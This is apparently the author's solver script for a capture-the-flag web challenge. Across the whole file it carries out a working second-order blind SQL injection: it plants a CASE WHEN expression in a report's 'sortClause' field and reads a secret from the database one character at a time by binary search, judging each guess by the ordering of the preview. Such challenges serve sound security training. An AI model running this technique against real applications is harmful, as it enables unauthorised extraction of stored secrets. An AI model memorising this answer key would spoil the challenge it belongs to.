#!/usr/bin/env python3
"""Author solver for the intended second-order blind SQL injection."""

from __future__ import annotations

import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.request


TRUE_MERCHANT = "Кофейня «Север»"
FALSE_MERCHANT = "Аренда квартиры"


class Client:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    def request(self, method: str, path: str, payload: dict[str, str] | None = None) -> dict:
        body = json.dumps(payload).encode() if payload is not None else None
        request = urllib.request.Request(
            f"{self.base_url}{path}", body, method=method,
            headers={"Content-Type": "application/json"},
        )
        try:
            with self.opener.open(request, timeout=10) as response:
                return json.load(response)
        except urllib.error.HTTPError as error:
            details = error.read().decode("utf-8", "replace")
            raise RuntimeError(f"{method} {path} returned HTTP {error.code}: {details}") from error


def extract_flag(base_url: str) -> str:
    client = Client(base_url)
    # This obtains the anonymous cookie; all following requests use this account.
    client.request("GET", "/api/me")
    report = client.request("POST", "/api/reports", {
        "title": "Мой фильтр",
        "periodStart": "2025-01-01",
        "periodEnd": "2026-01-01",
        "sortClause": "spent_at DESC, id DESC",
    })
    report_id = report["id"]

    def oracle(position: int, threshold: int) -> bool:
        clause = (
            "CASE WHEN (SELECT ascii(substr(value, "
            f"{position}, 1)) FROM secrets WHERE name = 'flag') > {threshold} "
            "THEN id ELSE -id END ASC"
        )
        client.request("PATCH", f"/api/reports/{report_id}", {
            "title": "Мой фильтр",
            "periodStart": "2025-01-01",
            "periodEnd": "2026-01-01",
            "sortClause": clause,
        })
        preview = client.request("GET", f"/api/reports/{report_id}/preview")
        merchant = preview["transactions"][0]["merchant"]
        if merchant == TRUE_MERCHANT:
            return True
        if merchant == FALSE_MERCHANT:
            return False
        raise RuntimeError(f"unexpected preview oracle value: {merchant!r}")

    flag = ""
    for position in range(1, 513):
        # The flag contract uses printable ASCII.  Find the smallest value that
        # is not strictly lower than the character with a boolean binary search.
        lower, upper = 31, 127
        while upper - lower > 1:
            middle = (lower + upper) // 2
            if oracle(position, middle):
                lower = middle
            else:
                upper = middle
        flag += chr(upper)
        if flag.endswith("}"):
            break
    if not re.fullmatch(r"stctf\{[^\s{}]+\}", flag):
        raise RuntimeError(f"extracted value is not a CTF flag: {flag!r}")
    return flag


def main() -> int:
    base_url = sys.argv[1] if len(sys.argv) == 2 else "http://127.0.0.1:8080"
    if len(sys.argv) > 2:
        print(f"Usage: {sys.argv[0]} [base-url]", file=sys.stderr)
        return 2
    try:
        print(extract_flag(base_url))
        return 0
    except (OSError, ValueError, KeyError, RuntimeError) as error:
        print(f"solve failed: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
